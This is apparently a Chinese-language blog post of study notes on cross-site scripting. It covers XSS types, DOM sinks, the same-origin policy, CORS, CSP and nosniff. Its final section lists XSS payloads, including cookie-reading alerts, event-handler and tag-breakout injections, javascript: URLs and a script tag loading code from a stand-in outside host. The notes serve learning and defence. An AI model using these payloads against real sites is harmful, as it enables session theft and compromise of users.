---
title: XSS
date: '2025-05-02 17:48:18'
updated: '2025-05-09 09:34:20'
permalink: /post/xss-z1jgiuq.html
comments: true
toc: true
---



# XSS

## XSS

XSS(跨站脚本攻击)，当网站将用户的输入不加过滤，消毒地拼接到HTML页面中，导致用户渲染这个HTML页面时，触发了其中的恶意脚本，导致信息泄露等危害

### 分类

XSS攻击主要有三种类型

#### 反射型XSS

又称非持久性XSS，这个类型指的是用户在输入什么内容提交到服务器后，服务器没有对数据处理或存储到数据库中，而是会原封不动的返回到页面中，加载到页面的HTML中，从而让用用户被攻击
最常见的就是搜索引擎
![image-20250423184447437](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250423184447437.png)

这种类型的注入都是动态产生的，所以是非持久的

一般要利用这种漏洞，需要攻击者构造具有相关攻击的url，将网页发送给受害者，并且受害者点击了这个url，就可能会导致受害者的信息泄露

#### 存储型XSS

又称持久型XSS，和反射型最大的不同就是存储型会将攻击脚本永久地存放在目标服务器，请求含有攻击脚本的目标网页就会触发
一般会存储在提交等交互功能，如发帖留言，用户名等，攻击者利用这些地方提交XSS，当用户打开页面时，前端从后端数据库获得数据时，攻击脚本可能就会获得数据

#### DOM型XSS

DOM型XSS是不会经过服务器的，而是直接从DOM、Window等对象中获取数据

> [!知识点]
> DOM是文档对象模型，是一种处理html或xml的标准api
> 会将这个文档处理为一种树形结构
> 让网站可以用javascript来对文档中的标签、属性、内容等进行增删改查的操作

一些可能会导致DOMXSS的接收器

```js
 document.write()
 document.writeln()
 document.domain
 element.innerHTML
 element.outerHTML
 element.insertAdjacentHTML
 element.onevent
 ……
```

像利用 `<img src='1' onerror="alert(1)"/>` 也可以产生XSS攻击

### 防御

* 过滤消毒转义
  - 过滤：通过黑白名单限制关键词的输入
  - 消毒：直接移除掉可能有害的代码，如 `<script>`，`onerror`等
  - 转义：将一些特殊的符号转换为文本，如 `''`，`<>`等

### **sop** 同源策略

同源策略是浏览器限制了不同源之间如何进行资源交互，用于隔离潜在恶意文件的安全机制，规定了跨源之间的脚本是隔离的，一个源的脚本不能访问/操作另一个源的绝大部分属性或方法

同源策略主要限制了以下行为

1. DOM访问限制：禁止不同源的脚本访问对方的DOM
2. 网络请求限制：限制使用XMLHttpRequest或Fetch API向不同源发起请求（这个主要是限制CSRF攻击）

> [!源]
> 在同源策略中，源由三部分组成
>
> * 协议
> * 域名
> * 端口
>
> 只有当这三个部分完全匹配时，两个url才属于同一个源

同源策略控制了不同源之间的交互，这种交互分为三类

* 通常允许源域写操作
  - 链接
  - 重定向
  - 表单提交
* 通常允许跨源资源嵌入
  - `<script src="..."></script>` 标签嵌入跨源脚本
  - `<link rel="stylesheet href="...">` 标签嵌入
  - `<img>`/`<viedo>`/`<audio>` 嵌入多媒体资源
  - `@font-face` 引入的字体，一些浏览器允许跨源字体
  - `<frame>` 和 `<iframe>` 载入的如何资源
* 通常不允许跨源资源读操作

这些操作可以在目标域允许，但是无法获取操作得到的资源，也不能影响目标网站的运行

#### CORS协议

全称是跨域资源共享，由于sop同源策略过于严格，导致有些网站体验不太号，通过这个标准，就可以允许浏览器读取跨域的资源
CORS 需要浏览器和服务器同时支持，整个通信过程，都是由浏览器自动完成，不需要用户操作，只要服务器实现了CORS接口，就可以跨源通信

### CSP 内容安全策略

CSP 类似于一种白名单，开发者明确告诉客户端，那些外部资源是可以加载或执行的，降低XSS的风险
CSP 可以通过HTTP头信息或meta元素定义

除了白名单外，CSP还有两种指定可信资源的方式

* `nonce`：CSP指令可以指定一个随机数，在加载脚本的标签中使用系统的随机数，如果值相同，就可以执行，随机数要在每次加载页面时生成
* `hashs`：CSP指令指定受信任的脚本的哈希值，如果实际脚本的哈希值和指定的哈希值不同，就不会执行脚本

### 内容嗅探机制

这是一种浏览器的机制，当浏览器识别到这个文件类型时，如img，pdf等，就会自动加载，如果这些文件中存在危害，就会触发

当服务器带着 `X-Content-Type-Options:nosniff` 响应头时，面对 `content-type` 未设置的响应时，不会自动推断响应内容的类型并打开

### XSS漏洞payload

`<script>` 标签

```html
<script>alert(1)</script>
<script>alert("marin")</script>
<script>alert(/marin/)</script>
<script>alert(document.cookie)</script>
  
<script src="http://xxx.com/xss.js"></script> 
<!--加载外部恶意脚本-->
```

基本上所有的标签都可以用 **on事件** 来触发恶意代码
`svg` 标签

```html
<svg onload="alert(1)">
```

`img` 标签

```html
<img src=1 onerror=alert(document.cookie)>
```

`body` 标签等

```html
<body onload=alert(document.cookie)>
```

HMTL5特性的XSS
相关特性可以参考[HTML5 Security Cheatsheet](https://html5sec.org/)中的内容
通过 `autofocus` 执行 `focus` 事件

```html
<input onfocus=alert(document.cookie) autofocus>
```

又或者利用多个 `autofocus` 触发 `onblur` 事件

```html
<input onblur=alert(document.cookie) autofocus>
<input autofocus>
```

闭合标签
当输入的内容会被加载到页面时，可以观察被传入的位置，尝试将传入位置的内容闭合后加入payload

```html
<h1 id=" payload ">
"><script>alert(1)</script>

<style>payload</style>
</style><script>alert(1)</script><style>
```

包含url的特性
当传入的内容被包含到一个 `href` 时

```html
<a href='payload'>Click here</a>
```

可以使用一个 `Javascript:` 协议的url来XSS

```
javascript:alert(1)
```

‍

‍

‍

‍

参考
[同源策略(SOP) | 网安](https://bergins-organization.gitbook.io/wang-an/develop/web/bi-ji/tong-yuan-ce-le-sop)
[4.2. XSS — Web安全学习笔记 1.0 文档](https://websec.readthedocs.io/zh/latest/vuln/xss/index.html)
